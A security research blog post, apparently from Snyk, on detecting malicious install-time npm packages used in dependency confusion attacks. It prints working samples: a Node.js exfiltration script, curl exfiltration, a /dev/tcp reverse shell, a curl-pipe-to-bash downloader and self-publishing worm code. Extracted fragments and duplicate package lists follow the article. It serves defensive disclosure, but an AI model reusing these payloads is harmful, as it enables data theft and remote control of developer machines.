@@ -1,0 +1,585 @@
+
+Snyk recently discovered over 200 malicious packages in the npm registry. While we acknowledge that vulnerability fatigue is an issue for developers, this article is not about the typical case of typosquatting or random malicious package. This article shares the findings of targeted attacks aimed at businesses and corporations that Snyk was able to detect and share the insights.
+In this post, instead of explaining what dependency confusion is and why it has dramatical impact on the JavaScript ecosystem (and the npm registry in particular), we’re going to focus on what kind of approach Snyk uses and what malicious packages we were able to discover recently. If you need a primer on dependency confusion and the risks they present, we recommend reading up on Alex Birsan’s Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies, and Snyk’s own disclosure of a targeted attack dependency attack simulation caught red-handed.
+Additionally, we want to talk about how bug bounty researchers and red teamers contribute to a polluted npm ecosystem, creating false security reports, and making the situation even more problematic than it had been before the rise of dependency confusion attack vectors.
+Recently, many companies have focused on supply chain security, and a big part of it is malicious packages detection. And we have no doubt that npm got most of the attention. Internally, we had a lot of discussions about npm: can we do better than other vendors who regularly publish about low-impact malicious packages? We decided to give it a try and implement a simple approach just to see how many malicious packages we could detect this way. Then we had a long way of tuning the simple approach and eventually, after the 100th malicious package was added to Snyk’s Vulnerability Database, we knew we had to write about it. But first, let’s explore how one would find malicious packages on a registry like npm.
+Finding malicious packages on the npm registry
+First of all, we needed to define the scope and goals for this security research:
+
+We only focused on install-time malicious logic. So, only what is happening during npm install. Run-time malicious scripts are out of scope and going to be covered in a future case study.
+Keep the amount of false-positive signals should be manageable. We defined it as one security analyst should be able to sort all leads out in one working hour or less.
+The collector should be modular. It had evolved multiple times already and continues to do so. Some of the detection techniques were added and some deleted due to #2.
+As an initial approach, we decided to go with purely static analyses. We are going to cover the dynamic part in another publication.
+It’s important to define what we count as malicious behavior. For example, opening a reverse shell or modifying files outside of the project folder is a malicious activity.
+But we also believe that if a package exfiltrates any personal identifying information (or any data which may contain PII), it can be counted as malicious. For example:
+
+A package sending machine GUID = not malicious– GUID does not contain any user personal data and is often used to count the unique number of installs of a package.
+A package sending application folder path = malicious – Application folder paths usually contain the current user name (which may be real first and last name).
+The structure of the underlying system consists from:
+
+Scraping logic to retrieve information about newly added and changed packages.
+Tagging logic to provide reasonable metadata to security analysts.
+Sorting logic to prioritize malicious package leads according to the previous step.
+The output of the collector system are YAML files (serves as data points for leads), which are then handled by a security analyst and flagged as three possible options:
+
+Good – Packages which have no suspicion. We use them as an example of non-malicious behavior.
+Bad – Malicious packages.
+Ignored – Packages which are probably not malicious, but the install-time behavior is too common or too complex to use it as a pattern for the future cases.
+npm registry reconnaissance to gather package information
+According to the first requirement we’ve set out, we need to handle all new and updated packages if they have any install-time scripts preinstall, install, or postinstall.
+The npm registry uses CouchDB under the hood. They conveniently expose CouchDB through replicate.npmjs.com for public consumption. So the data gathering part is as simple as polling the _changes endpoint in ascending order. Namely,
+1https://replicate.npmjs.com/_changes?limit=100&descending=false&since=<here is last event ID from the previous run>
+allows you to get a list of updated and created packages starting from the event ID which we have from the previous collector run.
+Additionally, we use endpoints https://registry.npmjs.org/ to retrieve metadata of each package from the list and https://api.npmjs.org/downloads to get the number of downloads of a package.
+There is only one tricky part about the data gathering logic — we want to extract install-time scripts from a package tarball. An average npm package tarball weighs less than a megabyte, but they can be huge sometimes, even hundreds of megabytes. Fortunately, tar archives are structured in a way which allows us to implement a streaming approach. We simply download a package archive until we have the file we are looking for and then drop the connection, saving a lot of time and network traffic. We use the tar-stream npm package for that purpose. This is a good opportunity to send a shout out to Mathias Buus, who’s been a great contributor to the JavaScript and Node.js development, and a maintainer of many open source npm packages who are helping day to day developers.
+Tagging malicious packages on the npm registry
+At this point we have all the metadata about the package: version history, maintainer name, install-time scripts content, dependencies and so on. We can start to apply rules. Here I’m going to show some of the rules which, in my experience, were most effective:
+
+bigVersion – If a package major version is more or equal to 90. In the dependency confusion attack, a malicious package to be downloaded should have a bigger version than the original one. As we will see later, malicious packages often have versions like 99.99.99.
+yearNoUpdates – Package is updated for the first time over the year. This plays a key signal to determine if a package was not maintained for a while and then got compromised by a threat actor.
+noGHTagLastVersion – New version of a package has no tag in a corresponding GitHub repository (although, previous version had it). This works for cases when an npm user was compromised, but not a GitHub user.
+isSuspiciousFile – We have a set of regular expressions to detect potentially malicious install-time scripts. They work to detect common obfuscation techniques, usage of domains like canarytokens.com or ngrok.io, indication of IP addresses and so on.
+isSuspiciousScript – A set of regular expressions to detect potentially malicious scripts in package.json file. For example, as we found out “postinstall: “node .” is often used in malicious packages.
+The underlying system has implemented more tags, but the above serves as a good list to have a sense of how the collector logic looks like.
+Sorting through the data of npm packages
+We’d like to apply further automations to the process, instead of manual review by security analysts. If an install-time script was already classified as good or bad in the past, we automatically classify new cases as good or bad accordingly. This mainly works for non-malicious behavior cases like “postinstall”: “webpack” or “postinstall”: “echo thanks for using please donate” and helps to reduce noise levels.
+Further, we prioritize certain tags to be handled before others because they give better true-positive signal rate. Namely isSuspiciousFile and isSuspiciousScript have the highest priority.
+Manual security analysis
+The last step of the detection process is manual analysis. It also goes in several stages:
+
+Verify automatically sorted and high-priority leads. They are most likely malicious. Go through unsorted leads one-by-one aiming to detect new rules for malicious or non-malicious cases.
+Update the collector logic according to #2.
+Add each malicious package to the Snyk Vulnerability Database.
+In some cases, like gxm-reference-web-auth-server, if a package seems to have unusual malicious logic, an analyst will spend more time to deeply analyze and share the insights with the community and Snyk’s users.
+This flow allows us to improve the collector every day and automate the process.
+Which malicious packages on npm were we able to detect?
+To this date, the system has already yielded results for more than 200 npm packages that are absolutely true-positive detection, and also serve as a viable dependency confusion attack threat. We’d like to further categorize these findings and demonstrate various behaviors and concepts that have been taken by attackers.
+Malicious packages which perform data exfiltration
+One of the most common types of malicious packages is data exfiltration over HTTP or DNS requests. It is often a modified copy-pasted version of the original script used in the dependency confusion research. Sometimes they have comments like “this package is used for research purposes” or “no sensitive data is retrieved” but don’t let it fool you — they get PII and send it over the network which should never happen.
+Typical example of such package from Snyk’s finding:
+1const os = require("os");
+2const dns = require("dns");
+3const querystring = require("querystring");
+4const https = require("https");
+5const packageJSON = require("./package.json");
+6const package = packageJSON.name;
+7
+8const trackingData = JSON.stringify({
+9    p: package,
+10    c: __dirname,
+11    hd: os.homedir(),
+12    hn: os.hostname(),
+13    un: os.userInfo().username,
+14    dns: dns.getServers(),
+15    r: packageJSON ? packageJSON.___resolved : undefined,
+16    v: packageJSON.version,
+17    pjson: packageJSON,
+18});
+19
+20var postData = querystring.stringify({
+21    msg: trackingData,
+22});
+23
+24var options = {
+25    hostname: "<malicious host>", 
+26    port: 443,
+27    path: "/",
+28    method: "POST",
+29    headers: {
+30        "Content-Type": "application/x-www-form-urlencoded",
+31        "Content-Length": postData.length,
+32    },
+33};
+34
+35var req = https.request(options, (res) => {
+36    res.on("data", (d) => {
+37        process.stdout.write(d);
+38    });
+39});
+40
+41req.on("error", (e) => {
+42    // console.error(e);
+43});
+44
+45req.write(postData);
+46req.end();
+We've seen attempts of exfiltration of the following information (sorted from relatively harmless to most dangerous):
+
+Current user name
+Home directory path
+Application directory path
+List of files in various folders like home or application working directory
+Result of ifconfig system command
+Application package.json file
+Environment variables
+The .npmrc file
+One interesting addition to this group of malicious packages is those that have the install script like npm install http://<malicious host>/tastytreats-1.0.0.tgz?yy=npm get cache. Clearly it exfiltrates the npm cache directory path (which is usually in the home folder of the current user), but additionally it installs a package from an external source. From our experience this external sourced package is always just a dummy package without any logic or files, but maybe it has regional or other conditions on the server side, or after a certain amount of time it will become a cryptominer or trojan.
+In some cases, we saw evidence of bash scripts such as:
+1DETAILS="$(echo -e $(curl -s ipinfo.io/)\\n$(hostname)\\n$(whoami)\\n$(hostname -i) | base64 -w 0)"
+2curl "https://<malicious host>/?q=$DETAILS"
+The above exfiltrates public IP address info, hostname, and user name.
+Malicious packages which spawn a reverse shell
+Another common type of malicious packages attempts to spawn a reverse shell, which means that the targeted machine connects to a remote server owned by an attacker, and allows for remote control by them. These can be as simple as the following:
+1/bin/bash -l > /dev/tcp/<malicious IP>/443 0<&1 2>&1;
+Or more complex implementations using net.Socket or other connection methods.
+The main challenge with this category is that though the logic looks simple, actual malicious behavior is completely hidden behind a hacker’s server side. That said, one can see the impact — a hacker can take full control of the computer where the malicious package is installed.
+We decided to execute one of the packages like this in a sandbox and the commands we recorded were the following:
+
+nohup curl -A O -o- -L http://<malicious IP>/dx-log-analyser-Linux | bash -s &> /tmp/log.out& – download and run script from the malicious server.
+The script downloaded from the malicious server added itself to the /tmp directory and started to poll itself every 10 seconds waiting for updates from the remote attacker.
+After a certain amount of time it downloaded a binary file which, according to VirusTotal, is a Cobalt Strike trojan.
+The use of trojans in malicious npm packages
+In this category ,we have various packages which install and run various command and control agents. Sharing more about these is beyond the scope of the article, so instead, we recommend you read our recent article about detailed reverse engineering of the gxm-reference-web-auth-server package. While that article lays out the findings of how ethical hackers have performed their red team ethical research, it is still a good example of what lies within npm packages in this category of malicious dependency confusion attacks. Also, it’s a cool example of catching a red team in action.
+In another interesting case, we checked for system calls from the sandbox and one was catching our attention: it spawned a detached process and executed a wait call for 30 minutes. And only then did it start its malicious activity.
+Finding pranks and protests in npm packages
+In March we wrote a publication about protestware npm packages. But in addition to protestware we observed various attempts to open YouTube or NSFW videos and other websites in your browser, or even add it as a command to your .bashrc file.
+The sample code can be as simple as open [https://www.youtube.com/watch?v=](https://www.youtube.com/watch?v=)<xxx> in the postinstall script or shell.exec(echo '\nopen https://<NSFW website>' >> ~/.bashrc) in an install-time JavaScript file.
+Another potentially harmful example of a malicious package that we detected during this investigation is a package which detects if you have an .npmrc file, and if so, it executes npm publish creating its own copy on behalf of your npm user. As you can see, it acts like a worm and, in some circumstances, can become a real threat.
+1const fs = require('fs')
+2const faker = require('faker')
+3const child_process = require('child_process')
+4const pkgName = faker.helpers.slugify(faker.animal.dog() + ' ' +
+5faker.company.bsNoun()).toLowerCase()
+6let hasNpmRc = false
+7const read = (p) => {
+8  return fs.readFileSync(p).toString()
+9}
+10try {
+11  const npmrcFile = read(process.env.HOME + '/.npmrc')
+12  hasNpmRc = true
+13} catch(err) {
+14}
+15if (hasNpmRc) {
+16  console.log('Publishing new version of myself')
+17  console.log('My new name', pkgName)
+18  const pkgPath = __dirname + '/package.json'
+19  const pkgJSON = JSON.parse(read(pkgPath))
+20  pkgJSON.name = pkgName
+21  fs.writeFileSync(pkgPath, JSON.stringify(pkgJSON, null, 2))
+22  child_process.exec('npm publish')
+23  console.log('DONE')
+24}
+Conclusions and recommendations
+At Snyk, everyday we work to make open source software ecosystems more secure. Today, we shared a couple variations of malicious npm packages but it is certainly not a comprehensive list. Our research showed that the npm ecosystem is actively used to perform various supply chain attacks. We recommend you to use tools like Snyk to protect you as a developer and maintainer, as well as your applications and projects.
+If you are a bug bounty hunter or red teamer and need to publish an npm package to perform recon activity, we recommend that you follow npm’s terms of service and legal guidelines, and in any case, do not exfiltrate any PII and explicitly define the purpose of the package either in source code comments or in package description. We observed a couple of legitimate research packages which were sending unique machine identifiers like node-machine-id.
+Get started in capture the flag
+Learn how to solve capture the flag challenges by watching our virtual 101 workshop on demand.
+Summary of affected packages as of publication
+As a summary, we’d like to publish the list of packages we were able to detect. Some, or perhaps most, at this point, are already deleted from the npm registry, but some exist still to the date of publishing this research.
+
+
+git-en-boite-app	insomnia-plugin-simple-hmac-auth
+selenium-applitools	api-extractor-test-01
+@tilliwilli/npm-lifecycles	vfdp-ui-framework
+klook-node-framework	next-plugin-normal
+klook-node-framework-affiliate	@iwcp/nebula-ui
+klook-tetris-server	react-dom-router-old
+klook-ui	react-dom-router-compatibility
+logquery	node-hawk-search
+@klooks/klook-node-framework	ual-content-page
+schema-render	npm_test_nothing
+tetris-scripts	lbc-git
+klook-node-framework-language	angieslist-composed-components
+klook-node-framework-country	angieslist-gulp-build-tasks
+klook-node-framework-currency	onepassword_events_api
+klook-node-framework-device	on-running-script-context
+klook-node-framework-logger	okbirthday2015
+klook-node-framework-site	oidc-frontend
+klook-node-framework-experiment	nucleus-wallet
+klook-node-framework-cache	videojs-vtt
+executables.handler	@commercialsalesandmarketing/contact-search
+tracer.node	cap-common-pages
+state.aggregator	coldstone-helpers
+rce-techroom	rainbow-bridge-testing
+acronis-ui-kit	npm-exec-noperm
+activity-iframe-sdk	npmbulabula
+angieslist-visitor-app-common	nozbedesktop
+uitk-react-rating	nodejs-email
+ldtzstxwzpntxqn	plugin-welcome
+gxm-reference-web-auth-server	polymer-shim-styles
+lznfjbhurpjsqmr	lexical-website-new
+npm_protect_pkg	paper-toolbar
+com.unity.xr.oculus	paytm-kafka-rest
+katt-util	phoenix.site
+workspace-hoist-all	assets-common
+qjwt	bolt-styles
+bigid-permissions	phub-dl
+@uc-maps/api.react	api-extractor-test-01
+@uc-maps/test	adroit-websdk-client
+@uc-maps/test1	f0-utils
+@uc-maps/boundaries-core.react	@uc-maps/boundaries-core.react
+@uc-maps/geospatial	elysium-ui
+@uc-maps/layer-select.react	portail-web
+@uc-maps/maps.react	postinstall-dummy
+@uc-maps/parcel-shapes	threatresponse
+wf_ajax	pratikyadavh2
+wf_apn	cap-products
+wf_storage	promoaline
+wf_scheduler	promohline
+bigid-filter-recursive-parser	promofline
+bigid-query-object-serialization	promoimmo
+yo-code-dependencies-versions	promohlineupselling
+abchdefntofknacuifnt	promotemplate
+generator-code-dependencies-versions	ptmproc
+@visiology-public-utilities/language-utils	quick-app-guide
+finco	razer-xdk
+azure-linux-tools	epic-games-self-service-portal
+com.unity.xr.oculus	pg-ng-popover
+@uieng/messaging-api	pco_api
+jptest1	lyft-avidl
+pegjs-override-action	pegjs-override-action
+jinghuan-jsb	stripe-connect-rocketrides
+kntl-digital3	flake8-holvi
+@sorare-marketplace/components	volgactf
+fc-gotcha	mb-blog
+com.unity.searcher	orangeonion.buildtools
+sixt	gatsby-plugin-added-by-parent-theme
+r3corda	gulp-browserify-thin
+got-hacked	eslint-plugin-seller-ui-eslint-plugin
+qweasdzxc	@seller-ui/settings
+
+We only focused on install-time malicious logic. So, only what is happening during npm install. Run-time malicious scripts are out of scope and going to be covered in a future case study.
+npm install
+Keep the amount of false-positive signals should be manageable. We defined it as one security analyst should be able to sort all leads out in one working hour or less.
+The collector should be modular. It had evolved multiple times already and continues to do so. Some of the detection techniques were added and some deleted due to #2.
+As an initial approach, we decided to go with purely static analyses. We are going to cover the dynamic part in another publication.
+A package sending machine GUID = not malicious– GUID does not contain any user personal data and is often used to count the unique number of installs of a package.
+A package sending application folder path = malicious – Application folder paths usually contain the current user name (which may be real first and last name).
+Scraping logic to retrieve information about newly added and changed packages.
+Tagging logic to provide reasonable metadata to security analysts.
+Sorting logic to prioritize malicious package leads according to the previous step.
+Good – Packages which have no suspicion. We use them as an example of non-malicious behavior.
+Bad – Malicious packages.
+Ignored – Packages which are probably not malicious, but the install-time behavior is too common or too complex to use it as a pattern for the future cases.
+preinstall
+install
+postinstall
+replicate.npmjs.com
+https://registry.npmjs.org/
+https://api.npmjs.org/downloads
+bigVersion – If a package major version is more or equal to 90. In the dependency confusion attack, a malicious package to be downloaded should have a bigger version than the original one. As we will see later, malicious packages often have versions like 99.99.99.
+bigVersion
+yearNoUpdates – Package is updated for the first time over the year. This plays a key signal to determine if a package was not maintained for a while and then got compromised by a threat actor.
+yearNoUpdates
+noGHTagLastVersion – New version of a package has no tag in a corresponding GitHub repository (although, previous version had it). This works for cases when an npm user was compromised, but not a GitHub user.
+noGHTagLastVersion
+isSuspiciousFile – We have a set of regular expressions to detect potentially malicious install-time scripts. They work to detect common obfuscation techniques, usage of domains like canarytokens.com or ngrok.io, indication of IP addresses and so on.
+isSuspiciousFile
+canarytokens.com
+ngrok.io
+isSuspiciousScript – A set of regular expressions to detect potentially malicious scripts in package.json file. For example, as we found out “postinstall: “node .” is often used in malicious packages.
+isSuspiciousScript
+“postinstall: “node .”
+“postinstall”: “webpack”
+“postinstall”: “echo thanks for using please donate”
+isSuspiciousFile
+isSuspiciousScript
+Verify automatically sorted and high-priority leads. They are most likely malicious. Go through unsorted leads one-by-one aiming to detect new rules for malicious or non-malicious cases.
+Update the collector logic according to #2.
+Add each malicious package to the Snyk Vulnerability Database.
+In some cases, like gxm-reference-web-auth-server, if a package seems to have unusual malicious logic, an analyst will spend more time to deeply analyze and share the insights with the community and Snyk’s users.
+Current user name
+Home directory path
+Application directory path
+List of files in various folders like home or application working directory
+Result of ifconfig system command
+ifconfig
+Application package.json file
+package.json
+Environment variables
+The .npmrc file
+.npmrc
+install
+npm install http://<malicious host>/tastytreats-1.0.0.tgz?yy=npm get cache
+net.Socket
+nohup curl -A O -o- -L http://<malicious IP>/dx-log-analyser-Linux | bash -s &> /tmp/log.out& – download and run script from the malicious server.
+nohup curl -A O -o- -L http://<malicious IP>/dx-log-analyser-Linux | bash -s &> /tmp/log.out&
+The script downloaded from the malicious server added itself to the /tmp directory and started to poll itself every 10 seconds waiting for updates from the remote attacker.
+/tmp
+After a certain amount of time it downloaded a binary file which, according to VirusTotal, is a Cobalt Strike trojan.
+.bashrc
+open [https://www.youtube.com/watch?v=](https://www.youtube.com/watch?v=)<xxx>
+postinstall
+shell.exec(echo '\nopen https://<NSFW website>' >> ~/.bashrc)
+.npmrc
+npm publish
+git-en-boite-core
+@seller-ui/products
+git-en-boite-app
+insomnia-plugin-simple-hmac-auth
+selenium-applitools
+api-extractor-test-01
+@tilliwilli/npm-lifecycles
+vfdp-ui-framework
+klook-node-framework
+next-plugin-normal
+klook-node-framework-affiliate
+@iwcp/nebula-ui
+klook-tetris-server
+react-dom-router-old
+klook-ui
+react-dom-router-compatibility
+logquery
+node-hawk-search
+@klooks/klook-node-framework
+ual-content-page
+schema-render
+npm_test_nothing
+tetris-scripts
+lbc-git
+klook-node-framework-language
+angieslist-composed-components
+klook-node-framework-country
+angieslist-gulp-build-tasks
+klook-node-framework-currency
+onepassword_events_api
+klook-node-framework-device
+on-running-script-context
+klook-node-framework-logger
+okbirthday2015
+klook-node-framework-site
+oidc-frontend
+klook-node-framework-experiment
+nucleus-wallet
+klook-node-framework-cache
+videojs-vtt
+executables.handler
+@commercialsalesandmarketing/contact-search
+tracer.node
+cap-common-pages
+state.aggregator
+coldstone-helpers
+rce-techroom
+rainbow-bridge-testing
+acronis-ui-kit
+npm-exec-noperm
+activity-iframe-sdk
+npmbulabula
+angieslist-visitor-app-common
+nozbedesktop
+uitk-react-rating
+nodejs-email
+ldtzstxwzpntxqn
+plugin-welcome
+gxm-reference-web-auth-server
+polymer-shim-styles
+lznfjbhurpjsqmr
+lexical-website-new
+npm_protect_pkg
+paper-toolbar
+com.unity.xr.oculus
+paytm-kafka-rest
+katt-util
+phoenix.site
+workspace-hoist-all
+assets-common
+qjwt
+bolt-styles
+bigid-permissions
+phub-dl
+@uc-maps/api.react
+api-extractor-test-01
+@uc-maps/test
+adroit-websdk-client
+@uc-maps/test1
+f0-utils
+@uc-maps/boundaries-core.react
+@uc-maps/boundaries-core.react
+@uc-maps/geospatial
+elysium-ui
+@uc-maps/layer-select.react
+portail-web
+@uc-maps/maps.react
+postinstall-dummy
+@uc-maps/parcel-shapes
+threatresponse
+wf_ajax
+pratikyadavh2
+wf_apn
+cap-products
+wf_storage
+promoaline
+wf_scheduler
+promohline
+bigid-filter-recursive-parser
+promofline
+bigid-query-object-serialization
+promoimmo
+yo-code-dependencies-versions
+promohlineupselling
+abchdefntofknacuifnt
+promotemplate
+generator-code-dependencies-versions
+ptmproc
+@visiology-public-utilities/language-utils
+quick-app-guide
+finco
+razer-xdk
+azure-linux-tools
+epic-games-self-service-portal
+com.unity.xr.oculus
+pg-ng-popover
+@uieng/messaging-api
+pco_api
+jptest1
+lyft-avidl
+pegjs-override-action
+pegjs-override-action
+jinghuan-jsb
+stripe-connect-rocketrides
+kntl-digital3
+flake8-holvi
+@sorare-marketplace/components
+volgactf
+fc-gotcha
+mb-blog
+com.unity.searcher
+orangeonion.buildtools
+sixt
+gatsby-plugin-added-by-parent-theme
+r3corda
+gulp-browserify-thin
+got-hacked
+eslint-plugin-seller-ui-eslint-plugin
+qweasdzxc
+@seller-ui/settings
+git-en-boite-core
+@seller-ui/products
+git-en-boite-app
+insomnia-plugin-simple-hmac-auth
+selenium-applitools
+api-extractor-test-01
+@tilliwilli/npm-lifecycles
+vfdp-ui-framework
+klook-node-framework
+next-plugin-normal
+klook-node-framework-affiliate
+@iwcp/nebula-ui
+klook-tetris-server
+react-dom-router-old
+klook-ui
+react-dom-router-compatibility
+logquery
+node-hawk-search
+@klooks/klook-node-framework
+ual-content-page
+schema-render
+npm_test_nothing
+tetris-scripts
+lbc-git
+klook-node-framework-language
+angieslist-composed-components
+klook-node-framework-country
+angieslist-gulp-build-tasks
+klook-node-framework-currency
+onepassword_events_api
+klook-node-framework-device
+on-running-script-context
+klook-node-framework-logger
+okbirthday2015
+klook-node-framework-site
+oidc-frontend
+klook-node-framework-experiment
+nucleus-wallet
+klook-node-framework-cache
+videojs-vtt
+executables.handler
+@commercialsalesandmarketing/contact-search
+tracer.node
+cap-common-pages
+state.aggregator
+coldstone-helpers
+rce-techroom
+rainbow-bridge-testing
+acronis-ui-kit
+npm-exec-noperm
+activity-iframe-sdk
+npmbulabula
+angieslist-visitor-app-common
+nozbedesktop
+uitk-react-rating
+nodejs-email
+ldtzstxwzpntxqn
+plugin-welcome
+gxm-reference-web-auth-server
+polymer-shim-styles
+lznfjbhurpjsqmr
+lexical-website-new
+npm_protect_pkg
+paper-toolbar
+com.unity.xr.oculus
+paytm-kafka-rest
+katt-util
+phoenix.site
+workspace-hoist-all
+assets-common
+qjwt
+bolt-styles
+bigid-permissions
+phub-dl
+@uc-maps/api.react
+api-extractor-test-01
+@uc-maps/test
+adroit-websdk-client
+@uc-maps/test1
+f0-utils
+@uc-maps/boundaries-core.react
+@uc-maps/boundaries-core.react
+@uc-maps/geospatial
+elysium-ui
+@uc-maps/layer-select.react
+portail-web
+@uc-maps/maps.react
+postinstall-dummy
+@uc-maps/parcel-shapes
+threatresponse
+wf_ajax
+pratikyadavh2
+wf_apn
+cap-products
+wf_storage
+promoaline
+wf_scheduler
+promohline
+bigid-filter-recursive-parser
+promofline
+bigid-query-object-serialization
+promoimmo
+yo-code-dependencies-versions
+promohlineupselling
+abchdefntofknacuifnt
+promotemplate
+generator-code-dependencies-versions
+ptmproc
+@visiology-public-utilities/language-utils
+quick-app-guide
+finco
+razer-xdk
+azure-linux-tools
+epic-games-self-service-portal
+com.unity.xr.oculus
+pg-ng-popover
+@uieng/messaging-api
+pco_api
+jptest1
+lyft-avidl
+pegjs-override-action
+pegjs-override-action
+jinghuan-jsb
+stripe-connect-rocketrides
+kntl-digital3
+flake8-holvi
+@sorare-marketplace/components
+volgactf
+fc-gotcha
+mb-blog
+com.unity.searcher
+orangeonion.buildtools
+sixt
+gatsby-plugin-added-by-parent-theme
+r3corda
+gulp-browserify-thin
+got-hacked
+eslint-plugin-seller-ui-eslint-plugin
+qweasdzxc
+@seller-ui/settings
